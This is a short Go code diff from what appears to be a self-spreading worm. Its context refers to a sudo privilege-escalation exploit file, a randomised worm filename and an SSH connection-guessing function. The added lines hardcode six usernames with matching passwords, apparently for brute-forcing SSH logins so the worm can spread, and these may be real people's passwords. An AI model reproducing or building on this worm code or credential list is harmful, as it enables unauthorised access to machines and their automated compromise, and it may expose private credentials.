@@ -19,6 +19,8 @@ var (
 	sudo_exploit_filename = "exploit_nss_manual"
 	worm_filename = "worm" + strconv.Itoa(rand.Intn(3))
 	timeout = time.Minute
+	users_const = [...]string {"enric", "guillem", "ubuntu", "manel", "lluis", "marti"}
+	pwds_const = [...]string {"arturitoRules", "GuillemXetoPass", "ubuntu", "PeatgeAp7", "JakeNineNine", "Martisu4presi"}
 )
 
 func GuessSSHConnectionFromFile (ip string) bool {
